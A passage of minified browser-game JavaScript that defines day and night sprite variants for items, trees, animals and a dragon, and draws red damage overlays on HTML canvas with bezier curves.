      sprite[Ie.GOLD_HELMET][Ie.DAY] = te(cr(0.58, 0, ["#dbce71", "#b29c32", "#c4bc51"]));
      sprite[Ie.GOLD_HELMET][Ie.NIGHT] = te(cr(0.58, 0, ["#2b7c57", "#15543c", "#1a7961"]));
      sprite[Ie.DIAMOND_HELMET] = [];
      sprite[Ie.DIAMOND_HELMET][Ie.DAY] = te(Rr(0.69, 0, ["#717171", "#485252", "#555555", "#65c7cd", "#4aadad", "#358d8b", "#c1e6ea", "#a6dce4"]));
      sprite[Ie.DIAMOND_HELMET][Ie.NIGHT] = te(Rr(0.69, 0, ["#183f3f", "#092121", "#123335", "#2b9390", "#277a74", "#1f665f", "#83ddd4", "#59c9c0"]));
      sprite[Ie.FIR] = [];
      sprite[Ie.FIR][Ie.DAY] = [];
      sprite[Ie.FIR][Ie.NIGHT] = [];
      sprite[Ie.FIR][Ie.DAY].push(te($t(1.3, ["#0a2d18", "#124c34", "#227248", "#ccedd9", "#2d7a55", "#3c9660", "#afddc1", "#bbefd0", "#0a2d18", "#e4efe8"])));
      sprite[Ie.FIR][Ie.DAY].push(te(Qt(1.5, ["#191919", "#134d35", "#247349", "#afddc1", "#bbefd0", "#e4efe8"])));
      sprite[Ie.FIR][Ie.DAY].push(te(Zt(1.5, ["#191919", "#134d35", "#247349", "#cde7d6", "#122d1c", "#e3eee7"])));
      sprite[Ie.FIR][Ie.NIGHT].push(te($t(1.3, ["#000000", "#0e3638", "#174a51", "#328587", "#174a51", "#1d5559", "#328587", "#48a8aa", "#0a2728", "#56afac"])));
      sprite[Ie.FIR][Ie.NIGHT].push(te(Qt(1.5, ["#000000", "#0e3638", "#174a51", "#328587", "#48a8aa", "#56afac"])));
      sprite[Ie.FIR][Ie.NIGHT].push(te(Zt(1.5, ["#000000", "#0e3638", "#174a51", "#328587", "#0a2728", "#56afac"])));
      sprite[Ie.DRAGON] = [];
      sprite[Ie.DRAGON][Ie.DAY] = te(dr(1, ["#292b2b", "#57aba6", "#80ccca", "#c42333", "#a4dad9", "#3e8294", "#ffffff", "#57aba6", "#ffffff"]));
      sprite[Ie.DRAGON][Ie.NIGHT] = te(dr(1, ["#050505", "#1d3a38", "#0b514a", "#200333", "#327570", "#1d3a38", "#ffffff", "#0b514a", "#63afa9"]));
      sprite[Ie.WING_LEFT] = [];
      sprite[Ie.WING_LEFT][Ie.DAY] = te(hr(1, ["#292b2b", "#a4dad9", "#1f3f3f", "#c1233b"]));
      sprite[Ie.WING_LEFT][Ie.NIGHT] = te(hr(1, ["#050505", "#327570", "#021724", "#200333"]));
      sprite[Ie.WING_RIGHT] = [];
      sprite[Ie.WING_RIGHT][Ie.DAY] = te(Ir(1, ["#292b2b", "#a4dad9", "#1f3f3f", "#c1233b"]));
      sprite[Ie.WING_RIGHT][Ie.NIGHT] = te(Ir(1, ["#050505", "#327570", "#021724", "#200333"]));
      sprite[Ie.DECORATION] = [];
      sprite[Ie.DECORATION][Ie.DAY] = [];
      sprite[Ie.DECORATION][Ie.NIGHT] = [];
      sprite[Ie.DECORATION][Ie.DAY] = [IMAGES.DECORATION_0D, IMAGES.DECORATION_1D, IMAGES.DECORATION_2D, IMAGES.DECORATION_3D, IMAGES.DECORATION_4D, IMAGES.DECORATION_5D, IMAGES.DECORATION_6D, IMAGES.DECORATION_7D, IMAGES.DECORATION_8D, IMAGES.DECORATION_9D, IMAGES.DECORATION_10D, IMAGES.DECORATION_11D, IMAGES.DECORATION_12D, IMAGES.DECORATION_13D, IMAGES.DECORATION_14D, IMAGES.DECORATION_15D, IMAGES.DECORATION_16D, IMAGES.DECORATION_17D, IMAGES.DECORATION_18D, IMAGES.DECORATION_19D, IMAGES.DECORATION_20D, IMAGES.DECORATION_21D, IMAGES.DECORATION_22D, IMAGES.DECORATION_23D, IMAGES.DECORATION_24D, IMAGES.DECORATION_25D, IMAGES.DECORATION_26D, IMAGES.DECORATION_27D, IMAGES.DECORATION_28D, IMAGES.DECORATION_29D, IMAGES.DECORATION_30D, IMAGES.DECORATION_31D, IMAGES.DECORATION_32D, IMAGES.DECORATION_33D, IMAGES.DECORATION_34D, IMAGES.DECORATION_35D, IMAGES.DECORATION_36D, IMAGES.DECORATION_37D, IMAGES.DECORATION_38D, IMAGES.DECORATION_39D, IMAGES.DECORATION_40D, IMAGES.DECORATION_41D, IMAGES.DECORATION_42D, IMAGES.DECORATION_43D, IMAGES.DECORATION_44D, IMAGES.DECORATION_45D, IMAGES.DECORATION_46D, IMAGES.DECORATION_47D, IMAGES.DECORATION_48D, IMAGES.DECORATION_49D, IMAGES.DECORATION_50D, IMAGES.DECORATION_51D, IMAGES.DECORATION_52D, IMAGES.DECORATION_53D, IMAGES.DECORATION_54D, IMAGES.DECORATION_55D];
      sprite[Ie.DECORATION][Ie.NIGHT] = [IMAGES.DECORATION_0N, IMAGES.DECORATION_1N, IMAGES.DECORATION_2N, IMAGES.DECORATION_3N, IMAGES.DECORATION_4N, IMAGES.DECORATION_5N, IMAGES.DECORATION_6N, IMAGES.DECORATION_7N, IMAGES.DECORATION_8N, IMAGES.DECORATION_9N, IMAGES.DECORATION_10N, IMAGES.DECORATION_11N, IMAGES.DECORATION_12N, IMAGES.DECORATION_13N, IMAGES.DECORATION_14N, IMAGES.DECORATION_15N, IMAGES.DECORATION_16N, IMAGES.DECORATION_17N, IMAGES.DECORATION_18N, IMAGES.DECORATION_19N, IMAGES.DECORATION_20N, IMAGES.DECORATION_21N, IMAGES.DECORATION_22N, IMAGES.DECORATION_23N, IMAGES.DECORATION_24N, IMAGES.DECORATION_25N, IMAGES.DECORATION_26N, IMAGES.DECORATION_27N, IMAGES.DECORATION_28N, IMAGES.DECORATION_29N, IMAGES.DECORATION_30N, IMAGES.DECORATION_31N, IMAGES.DECORATION_32N, IMAGES.DECORATION_33N, IMAGES.DECORATION_34N, IMAGES.DECORATION_35N, IMAGES.DECORATION_36N, IMAGES.DECORATION_37N, IMAGES.DECORATION_38N, IMAGES.DECORATION_39N, IMAGES.DECORATION_40N, IMAGES.DECORATION_41N, IMAGES.DECORATION_42N, IMAGES.DECORATION_43N, IMAGES.DECORATION_44N, IMAGES.DECORATION_45N, IMAGES.DECORATION_46N, IMAGES.DECORATION_47N, IMAGES.DECORATION_48N, IMAGES.DECORATION_49N, IMAGES.DECORATION_50N, IMAGES.DECORATION_51N, IMAGES.DECORATION_52N, IMAGES.DECORATION_53N, IMAGES.DECORATION_54N, IMAGES.DECORATION_55N];
      sprite[Ie.CAVE_STONES] = [];
      sprite[Ie.CAVE_STONES][Ie.DAY] = [];
      sprite[Ie.CAVE_STONES][Ie.NIGHT] = [];
      sprite[Ie.CAVE_STONES][Ie.DAY].push(te($i(1.1, false, ["#252B28", "#747471", "#83827e"], 0)));
      sprite[Ie.CAVE_STONES][Ie.DAY].push(te($i(0.9, false, ["#252B28", "#747471", "#83827e"], 1)));
      sprite[Ie.CAVE_STONES][Ie.DAY].push(te($i(1, false, ["#252B28", "#747471", "#83827e"], 2)));
      sprite[Ie.CAVE_STONES][Ie.DAY].push(te($i(0.9, false, ["#252B28", "#747471", "#83827e"], 2)));
      sprite[Ie.CAVE_STONES][Ie.NIGHT].push(te($i(1.1, false, ["#030d14", "#123335", "#183f3f"], 0)));
      sprite[Ie.CAVE_STONES][Ie.NIGHT].push(te($i(0.9, false, ["#030d14", "#123335", "#183f3f"], 1)));
      sprite[Ie.CAVE_STONES][Ie.NIGHT].push(te($i(1, false, ["#030d14", "#123335", "#183f3f"], 2)));
      sprite[Ie.CAVE_STONES][Ie.NIGHT].push(te($i(0.9, false, ["#030d14", "#123335", "#183f3f"], 2)));
      sprite[Ie.SHADOW_CAVE_STONES] = [];
      sprite[Ie.SHADOW_CAVE_STONES][Ie.DAY] = [];
      sprite[Ie.SHADOW_CAVE_STONES][Ie.NIGHT] = [];
      sprite[Ie.SHADOW_CAVE_STONES][Ie.DAY].push(te($i(1.1, true, ["#252B28", "#58645F", "#75827D"], 2)));
      sprite[Ie.SHADOW_CAVE_STONES][Ie.DAY].push(te($i(0.9, true, ["#252B28", "#58645F", "#75827D"], 2)));
      sprite[Ie.SHADOW_CAVE_STONES][Ie.DAY].push(te($i(1, true, ["#252B28", "#58645F", "#75827D"], 2)));
      sprite[Ie.SHADOW_CAVE_STONES][Ie.DAY].push(te($i(0.9, true, ["#252B28", "#58645F", "#75827D"], 2)));
      sprite[Ie.SHADOW_CAVE_STONES][Ie.NIGHT].push(te($i(1.1, true, ["#030d14", "#123335", "#183f3f"], 2)));
      sprite[Ie.SHADOW_CAVE_STONES][Ie.NIGHT].push(te($i(0.9, true, ["#030d14", "#123335", "#183f3f"], 2)));
      sprite[Ie.SHADOW_CAVE_STONES][Ie.NIGHT].push(te($i(1, true, ["#030d14", "#123335", "#183f3f"], 2)));
      sprite[Ie.SHADOW_CAVE_STONES][Ie.NIGHT].push(te($i(0.9, true, ["#030d14", "#123335", "#183f3f"], 2)));
      sprite[Ie.GOLD_WINTER] = [];
      sprite[Ie.GOLD_WINTER][Ie.DAY] = [];
      sprite[Ie.GOLD_WINTER][Ie.NIGHT] = [];
      sprite[Ie.GOLD_WINTER][Ie.DAY].push(te(et(1.5, 0, ["#2b280a", "#ddcf8a", "#f4efc6"])));
      sprite[Ie.GOLD_WINTER][Ie.DAY].push(te(et(1.3, 0, ["#2b280a", "#ddcf8a", "#f4efc6"])));
      sprite[Ie.GOLD_WINTER][Ie.DAY].push(te(et(1.1, 0, ["#2b280a", "#ddcf8a", "#f4efc6"])));
      sprite[Ie.GOLD_WINTER][Ie.NIGHT].push(te(et(1.5, 0, ["#0a2728", "#3e8989", "#50a09c"])));
      sprite[Ie.GOLD_WINTER][Ie.NIGHT].push(te(et(1.3, 0, ["#0a2728", "#3e8989", "#50a09c"])));
      sprite[Ie.GOLD_WINTER][Ie.NIGHT].push(te(et(1.1, 0, ["#0a2728", "#3e8989", "#50a09c"])));
      sprite[Ie.DIAMOND_WINTER] = [];
      sprite[Ie.DIAMOND_WINTER][Ie.DAY] = [];
      sprite[Ie.DIAMOND_WINTER][Ie.NIGHT] = [];
      sprite[Ie.DIAMOND_WINTER][Ie.DAY].push(te(it(1.1, 0, ["#123d38", "#70e0dd", "#95efea"])));
      sprite[Ie.DIAMOND_WINTER][Ie.DAY].push(te(it(0.9, 0, ["#123d38", "#70e0dd", "#95efea"])));
      sprite[Ie.DIAMOND_WINTER][Ie.DAY].push(te(it(0.7, 0, ["#123d38", "#70e0dd", "#95efea"])));
      sprite[Ie.DIAMOND_WINTER][Ie.NIGHT].push(te(it(1.1, 0, ["#123d38", "#47b2ac", "#5cccc4"])));
      sprite[Ie.DIAMOND_WINTER][Ie.NIGHT].push(te(it(0.9, 0, ["#123d38", "#47b2ac", "#5cccc4"])));
      sprite[Ie.DIAMOND_WINTER][Ie.NIGHT].push(te(it(0.7, 0, ["#123d38", "#47b2ac", "#5cccc4"])));
      sprite[Ie.AMETHYST] = [];
      sprite[Ie.AMETHYST][Ie.DAY] = [];
      sprite[Ie.AMETHYST][Ie.NIGHT] = [];
      sprite[Ie.AMETHYST][Ie.DAY].push(te(er(1.7, true, ["#1d051e", "#c27add", "#cd98e5"])));
      sprite[Ie.AMETHYST][Ie.DAY].push(te(er(1.5, true, ["#1d051e", "#c27add", "#cd98e5"])));
      sprite[Ie.AMETHYST][Ie.DAY].push(te(er(1.3, true, ["#1d051e", "#c27add", "#cd98e5"])));
      sprite[Ie.AMETHYST][Ie.NIGHT].push(te(er(1.7, true, ["#1d051e", "#41aaa0", "#5cccc4"])));
      sprite[Ie.AMETHYST][Ie.NIGHT].push(te(er(1.5, true, ["#1d051e", "#41aaa0", "#5cccc4"])));
      sprite[Ie.AMETHYST][Ie.NIGHT].push(te(er(1.3, true, ["#1d051e", "#41aaa0", "#5cccc4"])));
      sprite[Ie.WATERBLOCK] = [];
      sprite[Ie.WATERBLOCK][Ie.DAY] = [];
      sprite[Ie.WATERBLOCK][Ie.NIGHT] = [];
      sprite[Ie.WATERBLOCK][Ie.DAY].push(te(ir(1, ["#2d53c4"])));
      sprite[Ie.WATERBLOCK][Ie.NIGHT].push(te(ir(1, ["#2d53c4"])));
      sprite[Ie.ISLAND_BLOCK] = [];
      sprite[Ie.ISLAND_BLOCK][Ie.DAY] = [];
      sprite[Ie.ISLAND_BLOCK][Ie.NIGHT] = [];
      sprite[Ie.ISLAND_BLOCK][Ie.DAY].push(te(ir(1, ["#c4912d"])));
      sprite[Ie.ISLAND_BLOCK][Ie.NIGHT].push(te(ir(1, ["#c4912d"])));
      sprite[Ie.CAVE_STEP] = [];
      sprite[Ie.CAVE_STEP][Ie.DAY] = te(Er(1, ["#414040"]));
      sprite[Ie.CAVE_STEP][Ie.NIGHT] = te(Er(1, ["#153635"]));
      sprite[Ie.DOOR_WOOD_OPEN_WINTER] = [];
      sprite[Ie.DOOR_WOOD_OPEN_WINTER][Ie.DAY] = te(ct(1, false, ["#EBF2F0", "#EBF2F0", "#b2d4d1", "#b2d4d1", "#EBF2F0", "#b2d4d1"]));
      sprite[Ie.DOOR_WOOD_OPEN_WINTER][Ie.NIGHT] = te(ct(1, false, ["#136167", "#136167", "#24878f", "#24878f", "#136167", "#24878f"]));
      sprite[Ie.DOOR_STONE_OPEN_WINTER] = [];
      sprite[Ie.DOOR_STONE_OPEN_WINTER][Ie.DAY] = te(Rt(1, false, ["#EBF2F0", "#EBF2F0", "#b2d4d1", "#b2d4d1", "#EBF2F0", "#b2d4d1"]));
      sprite[Ie.DOOR_STONE_OPEN_WINTER][Ie.NIGHT] = te(Rt(1, false, ["#136167", "#136167", "#24878f", "#24878f", "#136167", "#24878f"]));
      sprite[Ie.DOOR_AMETHYST_OPEN_WINTER] = [];
      sprite[Ie.DOOR_AMETHYST_OPEN_WINTER][Ie.DAY] = te(Rt(1, false, ["#EBF2F0", "#EBF2F0", "#b2d4d1", "#b2d4d1", "#EBF2F0", "#b2d4d1"]));
      sprite[Ie.DOOR_AMETHYST_OPEN_WINTER][Ie.NIGHT] = te(Rt(1, false, ["#136167", "#136167", "#24878f", "#24878f", "#136167", "#24878f"]));
      sprite[Ie.DOOR_DIAMOND_OPEN_WINTER] = [];
      sprite[Ie.DOOR_DIAMOND_OPEN_WINTER][Ie.DAY] = te(bt(1, false, ["#EBF2F0", "#EBF2F0", "#b2d4d1", "#b2d4d1", "#EBF2F0", "#b2d4d1"]));
      sprite[Ie.DOOR_DIAMOND_OPEN_WINTER][Ie.NIGHT] = te(bt(1, false, ["#136167", "#136167", "#24878f", "#24878f", "#136167", "#24878f"]));
      sprite[Ie.DOOR_GOLD_OPEN_WINTER] = [];
      sprite[Ie.DOOR_GOLD_OPEN_WINTER][Ie.DAY] = te(gt(1, false, ["#EBF2F0", "#EBF2F0", "#b2d4d1", "#b2d4d1", "#EBF2F0", "#b2d4d1"]));
      sprite[Ie.DOOR_GOLD_OPEN_WINTER][Ie.NIGHT] = te(gt(1, false, ["#136167", "#136167", "#24878f", "#24878f", "#136167", "#24878f"]));
      sprite[Ie.FOX] = [];
      sprite[Ie.FOX][Ie.DAY] = te(Tr(0.9, ["#1d051e", "#ffffff", "#c41c50", "#2c2e2d", "#c63450", "#f7e7f0"]));
      sprite[Ie.FOX][Ie.NIGHT] = te(Tr(0.9, ["#123d38", "#1a847f", "#200333", "#131919", "#01333a", "#b6f2db"]));
      sprite[Ie.BEAR] = [];
      sprite[Ie.BEAR][Ie.DAY] = te(Ar(0.9, ["#1d051e", "#ffffff", "#c41c50", "#c63450", "#ffffff", "#f7e7f0", "#2b2d2d"]));
      sprite[Ie.BEAR][Ie.NIGHT] = te(Ar(0.9, ["#123d38", "#1a847f", "#200333", "#01333a", "#ffffff", "#b6f2db", "#2b2d2d"]));
      sprite[Ie.MINIMAP] = [];
      sprite[Ie.MINIMAP_CTX] = [];
      sprite[Ie.BIGMAP] = [];
      sprite[Ie.BIGMAP_CTX] = [];
      for (i = 0; i < 2; i++) {
        sprite[Ie.MINIMAP][i] = document.createElement("canvas");
        sprite[Ie.MINIMAP][i].width = 193;
        sprite[Ie.MINIMAP][i].height = 193;
        sprite[Ie.MINIMAP_CTX][i] = sprite[Ie.MINIMAP][i].getContext("2d");
        sprite[Ie.BIGMAP][i] = document.createElement("canvas");
        sprite[Ie.BIGMAP][i].width = 600;
        sprite[Ie.BIGMAP][i].height = 600;
        sprite[Ie.BIGMAP_CTX][i] = sprite[Ie.BIGMAP][i].getContext("2d");
      }
      sprite[Ie.SNOW_STEP] = [];
      sprite[Ie.SNOW_STEP][Ie.DAY] = te(Er(1, ["#c8e0de"]));
      sprite[Ie.SNOW_STEP][Ie.NIGHT] = te(Er(1, ["#147071"]));
      sprite[Ie.LAVA_STEP] = [];
      sprite[Ie.LAVA_STEP][Ie.DAY] = te(Er(1, ["#231912"]));
      sprite[Ie.LAVA_STEP][Ie.NIGHT] = te(Er(1, ["#021719"]));
      sprite[Ie.HURT_TREASURE_CHEST] = te(function (e, i) {
        var t = document.createElement("canvas");
        var r = t.getContext("2d");
        t.width = e * 253;
        t.height = e * 192;
        r.save();
        r.translate(e * 37, e * 94);
        Be(r, e * -7, e * -20, e * 14, e * 37, e * 20);
        r.restore();
        ye(r, i[0]);
        r.save();
        r.translate(e * 131, e * 94);
        Be(r, e * -84, e * -67, e * 168, e * 134, e * 20);
        r.restore();
        ye(r, i[0], i[0], e * 13);
        r.save();
        r.translate(e * 223, e * 94.5);
        Be(r, e * -5, e * -18.5, e * 10, e * 37, e * 20);
        r.restore();
        ye(r, i[0]);
        r.save();
        r.translate(e * 128.5, e * 170.5);
        Be(r, e * -22.5, e * -6.5, e * 45, e * 13, e * 20);
        r.restore();
        ye(r, i[0]);
        return t;
      }(0.5, ["#BB0000"]));
      sprite[Ie.HURT_FOX] = te(function (e, i) {
        var t = document.createElement("canvas");
        var r = t.getContext("2d");
        t.width = e * 161;
        t.height = e * 190;
        r.beginPath();
        r.lineCap = "round";
        r.lineJoin = "round";
        r.moveTo(e * 9, e * 93);
        r.bezierCurveTo(e * 17, e * 95, e * 19, e * 95, e * 21, e * 95);
        r.bezierCurveTo(e * 9, e * 83, e * 17, e * 93, e * 4, e * 76);
        r.bezierCurveTo(e * 11, e * 75, e * 11, e * 75, e * 18, e * 75);
        r.bezierCurveTo(e * 13, e * 67, e * 13, e * 67, e * 7, e * 59);
        r.bezierCurveTo(e * 14, e * 59, e * 14, e * 59, e * 21, e * 59);
        r.bezierCurveTo(e * 46, e * 35, e * 35, e * 45, e * 49, e * 31);
        r.bezierCurveTo(e * 53, e * 24, e * 51, e * 21, e * 51, e * 16);
        r.bezierCurveTo(e * 63, e * 23, e * 63, e * 24, e * 69, e * 29);
        r.bezierCurveTo(e * 76, e * 7, e * 75, e * 11, e * 76, e * 6);
        r.bezierCurveTo(e * 81, e * 12, e * 84, e * 18, e * 89, e * 27);
        r.bezierCurveTo(e * 95, e * 25, e * 100, e * 16, e * 105, e * 14);
        r.bezierCurveTo(e * 103, e * 25, e * 111, e * 33, e * 110, e * 34);
        r.bezierCurveTo(e * 123, e * 48, e * 123, e * 48, e * 136, e * 62);
        r.bezierCurveTo(e * 142, e * 60, e * 147, e * 59, e * 155, e * 58);
        r.bezierCurveTo(e * 147, e * 65, e * 147, e * 65, e * 139, e * 73);
        r.bezierCurveTo(e * 145, e * 73, e * 145, e * 73, e * 151, e * 73);
        r.bezierCurveTo(e * 145, e * 80, e * 145, e * 80, e * 138, e * 87);
        r.bezierCurveTo(e * 144, e * 88, e * 144, e * 88, e * 150, e * 89);
        r.bezierCurveTo(e * 125, e * 103, e * 125, e * 125, e * 113, e * 141);
        r.bezierCurveTo(e * 92, e * 178, e * 85, e * 177, e * 76, e * 178);
        r.bezierCurveTo(e * 64, e * 179, e * 51, e * 164, e * 35, e * 131);
        r.bezierCurveTo(e * 18, e * 95, e * 13, e * 99, e * 8, e * 93);
        r.closePath();
        ye(r, i, i, e * 4);
        r.beginPath();
        r.lineCap = "round";
        r.lineJoin = "round";
        r.moveTo(e * 25, e * 63);
        r.bezierCurveTo(e * 16, e * 58, e * 17, e * 51, e * 17, e * 33);
        r.bezierCurveTo(e * 19, e * 12, e * 21, e * 12, e * 32, e * 17);
        r.bezierCurveTo(e * 63, e * 31, e * 66, e * 45, e * 66, e * 54);
        ye(r, i, i, e * 4);
        r.beginPath();
        r.lineCap = "round";
        r.lineJoin = "round";
        r.moveTo(e * 91, e * 53);
        r.bezierCurveTo(e * 91, e * 40, e * 98, e * 33, e * 121, e * 20);
        r.bezierCurveTo(e * 137, e * 12, e * 137, e * 16, e * 139, e * 27);
        r.bezierCurveTo(e * 141, e * 49, e * 140, e * 57, e * 134, e * 64);
        ye(r, i, i, e * 4);
        return t;
      }(0.9, "#BB0000"));
      sprite[Ie.HURT_BEAR] = te(function (e, i) {
        var t = document.createElement("canvas");
        var r = t.getContext("2d");
        t.width = e * 147;
        t.height = e * 172;
        r.beginPath();
        r.lineCap = "round";
        r.lineJoin = "round";
        r.moveTo(e * 8, e * 50);
        r.bezierCurveTo(e * 15, e * 16, e * 49, e * 6, e * 67, e * 6);
        r.bezierCurveTo(e * 121, e * 3, e * 128, e * 32, e * 135, e * 48);
        r.bezierCurveTo(e * 146, e * 96, e * 124, e * 131, e * 96, e * 135);
        r.bezierCurveTo(e * 96, e * 158, e * 79, e * 156, e * 75, e * 156);
        r.bezierCurveTo(e * 50, e * 154, e * 53, e * 150, e * 52, e * 135);
        r.bezierCurveTo(e * 2, e * 127, e * 3, e * 87, e * 8, e * 50);
        r.closePath();
        ye(r, i, i, e * 4);
        r.beginPath();
        r.lineCap = "round";
        r.lineJoin = "round";
        r.moveTo(e * 14, e * 57);
        r.bezierCurveTo(e * 2, e * 50, e * 5, e * 22, e * 24, e * 22);
        r.bezierCurveTo(e * 41, e * 21, e * 54, e * 32, e * 55, e * 48);
        ye(r, i, i, e * 4);
        r.beginPath();
        r.lineCap = "round";
        r.lineJoin = "round";
        r.moveTo(e * 93, e * 47);
        r.bezierCurveTo(e * 94, e * 24, e * 116, e * 21, e * 120, e * 20);
        r.bezierCurveTo(e * 144, e * 17, e * 146, e * 52, e * 133, e * 58);
        ye(r, i, i, e * 4);
        return t;
      }(0.9, "#BB0000"));
      sprite[Ie.HURT_DRAGON] = te(function (e, i) {
        var t = document.createElement("canvas");
        var r = t.getContext("2d");
        t.width = e * 271;
        t.height = e * 366;
        r.beginPath();
        r.lineCap = "round";
        r.lineJoin = "round";
        r.moveTo(e * 133, e * 99);
        r.bezierCurveTo(e * 186, e * 123, e * 199, e * 152, e * 209, e * 169);
        r.bezierCurveTo(e * 228, e * 205, e * 224, e * 245, e * 190, e * 276);
        r.bezierCurveTo(e * 161, e * 296, e * 99, e * 292, e * 79, e * 274);
        r.bezierCurveTo(e * 49, e * 253, e * 47, e * 214, e * 50, e * 197);
        r.bezierCurveTo(e * 61, e * 143, e * 102, e * 113, e * 131, e * 99);
        r.closePath();
        ye(r, i[0]);
        r.beginPath();
        r.lineCap = "round";
        r.lineJoin = "round";
        r.moveTo(e * 73, e * 270);
        r.bezierCurveTo(e * 79, e * 280, e * 77, e * 280, e * 78, e * 287);
        r.bezierCurveTo(e * 78, e * 290, e * 83, e * 291, e * 82, e * 299);
        r.bezierCurveTo(e * 81, e * 301, e * 87, e * 301, e * 92, e * 314);
        r.bezierCurveTo(e * 94, e * 319, e * 100, e * 321, e * 107, e * 320);
        r.bezierCurveTo(e * 111, e * 323, e * 114, e * 324, e * 119, e * 320);
        r.bezierCurveTo(e * 137, e * 321, e * 146, e * 323, e * 139, e * 320);
        r.bezierCurveTo(e * 141, e * 324, e * 150, e * 324, e * 153, e * 320);
        r.bezierCurveTo(e * 168, e * 319, e * 171, e * 316, e * 173, e * 307);
        r.bezierCurveTo(e * 180, e * 305, e * 180, e * 301, e * 178, e * 296);
        r.bezierCurveTo(e * 183, e * 296, e * 185, e * 289, e * 188, e * 279);
        r.bezierCurveTo(e * 171, e * 286, e * 149, e * 290, e * 132, e * 289);
        r.bezierCurveTo(e * 101, e * 290, e * 86, e * 280, e * 74, e * 271);
        r.closePath();
        ye(r, i[0]);
        r.beginPath();
        r.lineCap = "round";
        r.lineJoin = "round";
        r.moveTo(e * 76, e * 252);
        r.bezierCurveTo(e * 85, e * 294, e * 96, e * 314, e * 103, e * 314);
        r.bezierCurveTo(e * 106, e * 316, e * 151, e * 314, e * 156, e * 314);
        r.bezierCurveTo(e * 169, e * 317, e * 182, e * 285, e * 191, e * 256);
        r.bezierCurveTo(e * 134.5, e * 254, e * 134.5, e * 254, e * 78, e * 252);
        r.closePath();
        ye(r, i[0]);
        r.beginPath();
        r.lineCap = "round";
        r.lineJoin = "round";
        r.moveTo(e * 84, e * 257);
        r.bezierCurveTo(e * 122, e * 273, e * 146, e * 268, e * 179, e * 261);
        r.bezierCurveTo(e * 190, e * 258, e * 187, e * 266, e * 178, e * 272);
        r.bezierCurveTo(e * 160, e * 284, e * 123, e * 282, e * 100, e * 277);
        r.bezierCurveTo(e * 73, e * 260, e * 79, e * 257, e * 84, e * 257);
        r.closePath();
        ye(r, i[0]);
        r.beginPath();
        r.lineCap = "round";
        r.lineJoin = "round";
        r.moveTo(e * 125, e * 65);
        r.bezierCurveTo(e * 133, e * 45, e * 136, e * 42, e * 141, e * 55);
        r.bezierCurveTo(e * 151, e * 96, e * 164, e * 117, e * 175, e * 134);
        r.bezierCurveTo(e * 203, e * 181, e * 207, e * 182, e * 208, e * 215);
        r.bezierCurveTo(e * 206, e * 240, e * 205, e * 246, e * 184, e * 258);
        r.bezierCurveTo(e * 161, e * 267, e * 131, e * 272, e * 86, e * 258);
        r.bezierCurveTo(e * 67, e * 252, e * 68, e * 239, e * 64, e * 216);
        r.bezierCurveTo(e * 62, e * 194, e * 72, e * 169, e * 92, e * 142);
        r.bezierCurveTo(e * 106, e * 121, e * 114, e * 101, e * 125, e * 65);
        r.closePath();
        ye(r, i[0]);
        r.beginPath();
        r.lineCap = "round";
        r.lineJoin = "round";
        r.moveTo(e * 115, e * 37);
        r.bezierCurveTo(e * 116, e * 28, e * 119, e * 27, e * 126, e * 37);
        r.bezierCurveTo(e * 134, e * 48, e * 134, e * 49, e * 132, e * 59);
        r.bezierCurveTo(e * 131, e * 67, e * 127, e * 65, e * 120, e * 56);
        r.bezierCurveTo(e * 114, e * 49, e * 113, e * 43, e * 115, e * 38);
        r.closePath();
        ye(r, i[0]);
        r.beginPath();
        r.lineCap = "round";
        r.lineJoin = "round";
        r.moveTo(e * 146, e * 34);
        r.bezierCurveTo(e * 152, e * 28, e * 155, e * 27, e * 157, e * 39);
        r.bezierCurveTo(e * 157, e * 45, e * 157, e * 49, e * 150, e * 56);
        r.bezierCurveTo(e * 141, e * 66, e * 138, e * 66, e * 138, e * 57);
        r.bezierCurveTo(e * 137, e * 50, e * 137, e * 47, e * 141, e * 42);
        r.closePath();
        ye(r, i[0]);
        r.beginPath();
        r.lineCap = "round";
        r.lineJoin = "round";
        r.moveTo(e * 143, e * 69);
        r.bezierCurveTo(e * 148, e * 56, e * 156, e * 50, e * 158, e * 58);
        r.bezierCurveTo(e * 159, e * 64, e * 160, e * 67, e * 153, e * 77);
        r.bezierCurveTo(e * 148, e * 83, e * 145, e * 84, e * 143, e * 77);
        r.closePath();
        ye(r, i[0]);
        r.beginPath();
        r.lineCap = "round";
        r.lineJoin = "round";
        r.moveTo(e * 149, e * 92);
        r.bezierCurveTo(e * 149, e * 89, e * 151, e * 84, e * 156, e * 79);
        r.bezierCurveTo(e * 161, e * 73, e * 163, e * 78, e * 162, e * 86);
        r.bezierCurveTo(e * 161, e * 91, e * 155, e * 99, e * 152, e * 98);
        r.closePath();
        ye(r, i[0]);
        r.beginPath();
        r.lineCap = "round";
        r.lineJoin = "round";
        r.moveTo(e * 111, e * 61);
        r.bezierCurveTo(e * 114, e * 51, e * 117, e * 51, e * 124, e * 64);
        r.bezierCurveTo(e * 128, e * 68, e * 128, e * 76, e * 126, e * 79);
        r.bezierCurveTo(e * 123, e * 84, e * 122, e * 82, e * 115, e * 74);
        r.bezierCurveTo(e * 112, e * 67, e * 115, e * 74, e * 115, e * 74);
        r.bezierCurveTo(e * 111, e * 68, e * 111, e * 66, e * 111, e * 62);
        r.closePath();
        ye(r, i[0]);
        r.beginPath();
        r.lineCap = "round";
        r.lineJoin = "round";
        r.moveTo(e * 107, e * 81);
        r.bezierCurveTo(e * 108, e * 74, e * 112, e * 73, e * 118, e * 84);
        r.bezierCurveTo(e * 122, e * 88, e * 122, e * 93, e * 121, e * 98);
        r.bezierCurveTo(e * 114, e * 98, e * 113, e * 98, e * 109, e * 90);
        r.bezierCurveTo(e * 107, e * 87, e * 106, e * 85, e * 107, e * 82);
        r.closePath();
        ye(r, i[0]);
        return t;
      }(1, ["#BB0000"]));
      sprite[Ie.HURT_WING_LEFT] = te(function (e, i) {
        var t = document.createElement("canvas");
        var r = t.getContext("2d");
        t.width = e * 85;
        t.height = e * 145;
        r.translate(e * -20, e * -95);
        r.beginPath();
        r.lineCap = "round";
        r.lineJoin = "round";
        r.moveTo(e * 50, e * 105);
        r.bezierCurveTo(e * 52, e * 119, e * 64, e * 137, e * 71, e * 146);
        r.bezierCurveTo(e * 71, e * 161, e * 74, e * 169, e * 79, e * 179);
        r.bezierCurveTo(e * 68, e * 192, e * 70, e * 204, e * 69, e * 216);
        r.bezierCurveTo(e * 50, e * 189.5, e * 50, e * 189.5, e * 31, e * 163);
        r.closePath();
        ye(r, i);
        r.beginPath();
        r.lineCap = "round";
        r.lineJoin = "round";
        r.moveTo(e * 44, e * 106);
        r.bezierCurveTo(e * 49, e * 90, e * 58, e * 104, e * 51, e * 121);
